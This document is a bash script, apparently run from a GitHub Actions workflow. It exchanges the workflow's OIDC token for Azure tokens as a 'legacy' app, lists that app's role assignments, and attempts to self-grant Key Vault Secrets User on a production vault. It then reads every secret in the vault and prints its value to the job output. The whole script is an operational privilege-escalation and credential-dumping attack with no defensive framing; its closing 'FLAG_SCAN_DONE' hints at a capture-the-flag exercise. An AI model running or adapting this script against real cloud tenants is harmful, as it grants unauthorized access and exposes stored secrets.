#!/usr/bin/env bash
set +e
LEGACY=891fb158-e02c-4428-a885-53b811f369c0; OID=43834909-47cf-4a4a-8048-e323b4897ed3
S=$AZURE_SUBSCRIPTION_ID; RG=rg-tbl-platform-prod-sea
ID=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
exch(){ curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d grant_type=client_credentials -d client_id=$1 --data-urlencode "scope=$2" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$ID"; }
AT=$(exch $LEGACY "https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "arm token: ${#AT}"
echo "=== legacy-admin role assignments (sub) ==="
curl -s -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$S/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'$OID'" | python3 -c '
import sys,json
RM={"8e3af657-a8ff-443c-a75c-2fe8c4bcb635":"Owner","18d7d88d-d35e-4fb5-a5c3-7773c20a72d9":"UserAccessAdmin","acdd72a7-3385-48ef-bd42-f606fba81ae7":"Reader","b24988ac-6180-42a0-ab88-20f7382dd24c":"Contributor","4633458b-17de-408a-b874-0445c86b69e6":"KVSecretsUser","00482a5a-887f-4fb3-b363-3b7fe8e74483":"KVAdmin"}
v=json.load(sys.stdin).get("value",[])
[print("  ",RM.get(r["properties"]["roleDefinitionId"].split("/")[-1],r["properties"]["roleDefinitionId"].split("/")[-1]),"@",r["properties"]["scope"]) for r in v] or print("  none")
'
echo "=== attempt self-grant KV Secrets User on kv-tbl-sec ==="
SEC="/subscriptions/$S/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
RAID=$(python3 -c 'import uuid;print(uuid.uuid4())')
GR=$(curl -s -X PUT -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -d "{\"properties\":{\"roleDefinitionId\":\"/subscriptions/$S/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6\",\"principalId\":\"$OID\",\"principalType\":\"ServicePrincipal\"}}" "https://management.azure.com$SEC/providers/Microsoft.Authorization/roleAssignments/$RAID?api-version=2022-04-01")
echo "$GR" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("GRANT OK" if d.get("id") else d.get("error",{}).get("code"),"|",d.get("error",{}).get("message","")[:120])'
echo "=== wait + read kv-tbl-sec ==="
sleep 20
VT=$(exch $LEGACY "https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
curl -s -H "Authorization: Bearer $VT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" > /tmp/list.json
cat /tmp/list.json | head -c 400; echo
for SID in $(python3 -c 'import json;[print(x["id"]) for x in json.load(open("/tmp/list.json")).get("value",[])]' 2>/dev/null); do
  echo "   $SID = $(curl -s -H "Authorization: Bearer $VT" "$SID?api-version=7.4" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')"
done
echo "FLAG_SCAN_DONE"
